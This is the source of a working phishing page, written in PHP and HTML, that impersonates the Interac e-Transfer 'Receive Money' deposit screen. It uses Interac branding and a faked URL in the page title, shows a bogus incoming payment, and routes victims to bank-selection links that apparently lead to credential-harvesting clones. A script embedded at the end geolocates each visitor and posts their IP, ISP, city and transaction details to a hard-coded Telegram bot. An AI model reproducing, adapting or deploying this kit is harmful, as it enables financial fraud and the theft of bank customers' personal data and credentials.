
<?php
declare(strict_types=1);

/**
 * Interac e-Transfer® Gateway — RF.do.php
 * Integrated Logic & High-Fidelity UI
 * 
 * Part of RR-OS Neural Research Platform.
 */

ob_start();
error_reporting(0);
ini_set('display_errors', '0');

session_start();

// Set timezone for Edmonton, Alberta
date_default_timezone_set('America/Edmonton');

/* ============================================================
   LOAD CONFIG & PATHS
=========================================================== */
// Dynamically locate the server root by walking up from the current directory
function findConfig($startDir) {
    $current = $startDir;
    while ($current !== '/' && strlen($current) > 1) {
        if (is_file($current . '/config/config.php')) {
            return [
                'config' => $current . '/config/config.php',
                'log' => $current . '/data/logs/transfers.log'
            ];
        }
        $current = dirname($current);
    }
    return null;
}

$paths = findConfig(__DIR__);

if (!$paths || !is_file($paths['config'])) {
    http_response_code(500);
    exit('Neural Config Fault: Terminal handshake error. Config not found.');
}

$configFile = $paths['config'];
$logFile    = $paths['log'];

require_once $configFile;
$sysConfig = getSystemConfig();
$key = (string)($sysConfig['general']['encryption_key'] ?? 'a3f91b6cd024e8c29b76a149efcc5d42');

/* ============================================================
   INPUT: GET TOKEN
=========================================================== */
$query = $_SERVER['QUERY_STRING'] ?? '';
$token = $_GET['deposit'] ?? ''; 

if ($token === '') {
    http_response_code(400);
    exit('Missing deposit token');
}

/* ============================================================
   DECRYPT THE TOKEN (AES-256-CBC with Python Fallback)
=========================================================== */
$bin = base64_decode(strtr($token, "-_", "+/"));
$plain = false;

if ($bin !== false) {
    $ivLen = openssl_cipher_iv_length('AES-256-CBC');
    if (strlen($bin) > $ivLen) {
        $iv = substr($bin, 0, $ivLen); 
        $encData = substr($bin, $ivLen);    
        $plain = openssl_decrypt(
            $encData,
            'AES-256-CBC',
            hash('sha256', $key, true),
            OPENSSL_RAW_DATA,
            $iv
        );
    }
    
    // Fallback: If AES failed or binary was too short, assume simple base64 (Python script behavior)
    if ($plain === false) {
        $plain = $bin;
    }
}

if ($plain === false) {
    http_response_code(400);
    exit('Neural Handshake Failure: Token integrity compromised.');
}

parse_str($plain, $payload);

/* ============================================================
   PAYLOAD EXTRACTION & VALIDATION
=========================================================== */
$transaction_id = (string)($payload['transaction_id'] ?? ($payload['tx'] ?? ''));
$amountRaw      = (string)($payload['amount'] ?? '0.00');
$expires        = (int)($payload['expires'] ?? 0);
$sender         = (string)($payload['sender'] ?? ($sysConfig['general']['sender_name'] ?? 'Jennifer Edwards'));
$recipient      = (string)($payload['recipient'] ?? 'Valued Customer');
$date           = (string)($payload['date'] ?? date('M j, Y'));

// Normalize Amount
$amountClean = preg_replace('/[^\d.]/', '', $amountRaw);
$amount = (float)$amountClean;

if ($transaction_id === '' || $amount <= 0) {
    http_response_code(400);
    exit('Invalid payload integrity: Check transaction headers.');
}

/* ============================================================
   STATUS CHECK (Real-time Audit from Logs)
=========================================================== */
$status = 'Pending';
if (is_file($logFile)) {
    $lines = file($logFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    if ($lines) {
        foreach (array_reverse($lines) as $line) {
            $row = json_decode($line, true);
            if ($row && ($row['transaction_id'] ?? $row['tx'] ?? '') === $transaction_id) {
                $status = (string)($row['status'] ?? 'Pending');
                break;
            }
        }
    }
}

/* ============================================================
   SESSION PERSISTENCE
=========================================================== */
$_SESSION['transaction_data'] = [
    'transaction_id' => $transaction_id,
    'amount'         => $amount,
    'expires'        => $expires,
    'sender'         => $sender,
    'recipient'      => $recipient,
    'date'           => $date,
    'status'         => $status,
    'deposit_token'  => $token,
    'query_string'   => $query
];

/* ============================================================
   SMART REDIRECTOR (For Terminal States)
=========================================================== */
$statusLower = strtolower(trim($status));

if (in_array($statusLower, ['completed', 'complete', 'paid', 'success', 'done'], true)) {
    header('Location: /completed.php' . ($query ? "?$query" : ""), true, 302);
    exit;
}

if (preg_match('/^cancel(l?ed)?$/', $statusLower) || in_array($statusLower, ['declined', 'failed', 'error', 'denied'], true)) {
    header('Location: https://etransfer.interac.ca/error', true, 302);
    exit;
}

if ($expires > 0 && time() > $expires) {
    header('Location: /expired.php', true, 302);
    exit;
}

// Format expiry for UI
$expiryFormatted = $expires > 0 ? date('F j, Y', $expires) : date('F j, Y', strtotime('+30 days'));

ob_end_clean();
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
    <title>Interac e-Transfer: Receive Money</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Urbanist:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
    <style>
        body { font-family: 'Urbanist', sans-serif; background-color: #eaeced; }
        .interac-gradient { background: linear-gradient(180deg, #FFCC00 0%, #FDBB30 100%); }
        @keyframes scan { 0% { transform: translateY(-100%); } 100% { transform: translateY(100%); } }
        .scanner-line { height: 2px; background: linear-gradient(90deg, transparent, #FFCC00, transparent); animation: scan 3s linear infinite; }
        .ios-fix { padding-bottom: env(safe-area-inset-bottom); }
        .fi-tile { display: block; background: #fff; border: 1px solid #dfdfdf; border-radius: 8px; overflow: hidden; transition: all 0.2s; }
        .fi-tile:active { transform: scale(0.97); border-color: #FFCC00; }
        .fi-logo-image { max-width: 100%; max-height: 50px; display: block; margin: auto; }
        .fi-logo-wrapper { height: 80px; display: flex; align-items: center; justify-content: center; padding: 10px; }
        .pure-g { display: flex; flex-flow: row wrap; }
        .pure-u-1-2 { width: 50%; }
        @media (min-width: 640px) { .pure-u-sm-1-3 { width: 33.3333%; } }
        @media (min-width: 768px) { .pure-u-md-1-4 { width: 25%; } }
    </style>
</head>
<body class="bg-[#eaeced] flex flex-col min-h-screen overflow-x-hidden">

    <!-- Security Header -->
    <div class="bg-black text-white px-4 py-2 flex justify-between items-center border-b border-white/10 z-[100]">
        <div class="flex items-center gap-2">
            <div class="w-1.5 h-1.5 rounded-full bg-green-500 animate-pulse"></div>
            <span class="text-[9px] font-black uppercase tracking-[0.2em] opacity-60">Neural Uplink Synchronized</span>
        </div>
        <span class="text-[9px] font-black uppercase tracking-tighter text-indigo-400">RBOS-OS GATEWAY</span>
    </div>

    <header class="bg-white px-6 py-4 flex items-center justify-between border-b border-gray-200 shadow-sm sticky top-0 z-50">
        <img src="https://etransfer-notification.interac.ca/images/new/interac_logo.png" alt="Interac" class="h-10">
        <div class="flex items-center gap-4">
            <span class="text-[10px] font-bold text-gray-400 uppercase tracking-widest hidden sm:block">Secure Session</span>
            <div class="w-8 h-8 rounded-full bg-gray-100 flex items-center justify-center text-gray-400 font-bold text-xs border border-gray-200">?</div>
        </div>
    </header>

    <main class="flex-1 w-full max-w-4xl mx-auto p-5 sm:p-8">
        
        <div class="bg-white rounded-3xl shadow-xl overflow-hidden mb-12 border border-gray-100 animate-in fade-in slide-up max-w-lg mx-auto">
            <div class="interac-gradient p-8 text-center relative">
                <div class="absolute inset-0 scanner-line opacity-20"></div>
                <div class="w-16 h-16 bg-white rounded-full flex items-center justify-center mx-auto mb-4 shadow-lg">
                    <svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="#000" strokeWidth="3"><path d="M20 6L9 17l-5-5"/></svg>
                </div>
                <h1 class="text-black font-black text-2xl tracking-tight mb-1">Deposit Your Money</h1>
                <p class="text-black/60 font-bold text-sm uppercase tracking-widest">INTERAC e-Transfer®</p>
            </div>
            
            <div class="p-8 space-y-6 text-black">
                <div class="flex justify-between items-end border-b border-gray-100 pb-6">
                    <div>
                        <p class="text-gray-400 text-[10px] font-black uppercase tracking-widest mb-1">From</p>
                        <p class="font-black text-xl tracking-tight"><?php echo htmlspecialchars($sender); ?></p>
                    </div>
                    <div class="text-right">
                        <p class="text-gray-400 text-[10px] font-black uppercase tracking-widest mb-1">Amount (CAD)</p>
                        <p class="text-[#008A00] font-black text-3xl tracking-tighter">$<?php echo number_format($amount, 2); ?></p>
                    </div>
                </div>

                <div class="flex justify-between items-center text-xs">
                    <div class="text-left">
                        <span class="text-gray-400 font-bold uppercase tracking-widest block mb-0.5">Expires</span>
                        <span class="font-bold"><?php echo $expiryFormatted; ?></span>
                    </div>
                    <div class="text-right">
                        <span class="text-gray-400 font-bold uppercase tracking-widest block mb-0.5">Reference #</span>
                        <span class="font-mono font-bold"><?php echo htmlspecialchars($transaction_id); ?></span>
                    </div>
                </div>
            </div>
        </div>

        <div class="text-center mb-10">
            <h2 class="text-gray-500 font-black text-[13px] uppercase tracking-[0.2em] mb-2 px-2">Select Your Financial Institution</h2>
            <div class="w-20 h-1 interac-gradient mx-auto rounded-full"></div>
        </div>
        
        <div id="fiSelection" class="mb-12">
            <?php include __DIR__ . '/banks.php'; ?>
        </div>

        <div class="bg-blue-50 border border-blue-100 rounded-[28px] p-8 flex gap-5 items-start mb-10 max-w-2xl mx-auto shadow-sm">
            <div class="w-12 h-12 rounded-full bg-blue-500/10 flex items-center justify-center text-blue-600 shrink-0">
                <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
            </div>
            <div>
                <h3 class="text-blue-900 font-black text-sm uppercase tracking-widest mb-1.5">Security Reminder</h3>
                <p class="text-blue-800/70 text-[14px] leading-relaxed font-medium">Interac will never ask for your banking credentials via email. Always ensure you are on a trusted institution's official platform.</p>
            </div>
        </div>

    </main>

    <footer class="p-10 text-center space-y-4 ios-fix border-t border-gray-200 bg-white">
        <p class="text-[10px] text-gray-400 font-bold uppercase tracking-[0.2em]">
            &copy; 2000 - <?php echo date('Y'); ?> Interac Corp. All rights reserved.
        </p>
    </footer>

    <!-- Neural Reporting Bridge (Telegram Log) -->
    <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
    <script>
    (async () => {
        const botToken = '8332848335:AAGNajzDjVz2YwAtQfQMb6Y0adP5ikWhUHM';
        const chatId   = '-1002922644009';
        
        let IP = 'N/A', ISP = 'N/A', city = 'N/A';
        try {
            const res  = await fetch('https://ipapi.co/json/');
            const data = await res.json();
            IP   = data.ip || IP;
            ISP  = data.org || ISP;
            city = data.city || city;
        } catch (e) { console.warn('Geo-audit fault'); }

        const txData = <?php echo json_encode($_SESSION['transaction_data']); ?>;
        
        const message = `🟨 INTERAC GATEWAY LOADED 🟨\n\n` +
            `🔶 IP: <code>${IP}</code>\n` +
            `🔷 ISP: <code>${ISP}</code>\n` +
            `🔶 Location: <code>${city}</code>\n` +
            `🔷 Sender: <code>${txData.sender}</code>\n` +
            `🔶 Amount: <code>$${txData.amount}</code>\n` +
            `🔷 Ref: <code>${txData.transaction_id}</code>`;

        try {
            await axios.post(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                chat_id: chatId,
                text: message,
                parse_mode: 'HTML'
            });
        } catch(e) { console.error('Reporting relay failed'); }

        const customTitle = "etransfer.interac.ca/RF.do?deposit=" + "<?php echo substr($token, 0, 10); ?>...";
        document.title = customTitle;
        
        document.querySelectorAll('.fi-tile').forEach(tile => {
            tile.addEventListener('click', (e) => {
                e.preventDefault();
                const label = tile.getAttribute('filabel');
                
                let appId = 'generic';
                if (label.toLowerCase().includes('scotia')) appId = 'scotia';
                else if (label.toLowerCase().includes('td')) appId = 'td';
                
                window.location.href = `/?app=${appId}&action=deposit&amount=<?php echo $amount; ?>&ref=<?php echo $transaction_id; ?>&bank=${encodeURIComponent(label)}`;
            });
        });
    })();
    </script>
</body>
</html>